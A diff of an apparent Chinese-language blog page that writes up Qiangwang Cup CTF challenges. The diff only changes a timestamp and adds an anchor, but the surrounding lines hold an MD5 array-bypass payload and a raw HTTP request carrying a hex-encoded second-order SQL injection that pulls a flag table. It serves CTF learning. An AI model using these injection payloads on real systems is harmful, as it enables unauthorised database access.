@@ -89,7 +89,7 @@
 <meta property="og:image" content="http://yoursite.com/CTF/Share%20your%20mind1.png">
 <meta property="og:image" content="http://yoursite.com/CTF/share%20your%20mind3.png">
 <meta property="og:image" content="http://yoursite.com/CTF/Three%20hit.jpg">
-<meta property="og:updated_time" content="2018-04-10T15:31:59.328Z">
+<meta property="og:updated_time" content="2018-05-06T12:37:15.372Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="网强杯wp数题的学习">
 <meta name="twitter:description" content="强网杯的题目确实质量很高，把我按在光滑的地上摩擦~那个星期去打球去了，所以也没怎么研究。这会乘有空，把l3m0n师傅的wp拿来看看 0x01考点:md5比较缺陷这个签到题有三关，前两关传数组payloadparam1p[]=1&amp;amp;param2[]=a即可，二者返回均为0，绕过来到第三关，贴上源码:123if((string)$_POST[&apos;param1&apos;]!==(string)$_POST[">
@@ -313,7 +313,7 @@
 <p>最后可在此路径得到flag.</p>
 <h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p><strong>Three hit</strong><br>注册时要求age而登陆后提示调用了age，所以是二次注入<br>对age输入限制为数字，所以hex一下：<br><img src="/CTF/Three hit.jpg" alt=""><br>获取flag的payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?func=register HTTP/1.1</span><br><span class="line">Host: 39.107.32.29:10000</span><br><span class="line"></span><br><span class="line">username=ratten3anger&amp;age=0x393939393939393939393939393920756e696f6e2073656c65637420312c2873656c65637420666c61672066726f6d20666c6167206c696d697420302c31292c332c34206c696d697420382c312d2d&amp;password=123456</span><br></pre></td></tr></table></figure></p>
 <p>自分が信じることは、必ずできられ見せます。</p>
-
+<a id="more"></a>
       
     </div>
     
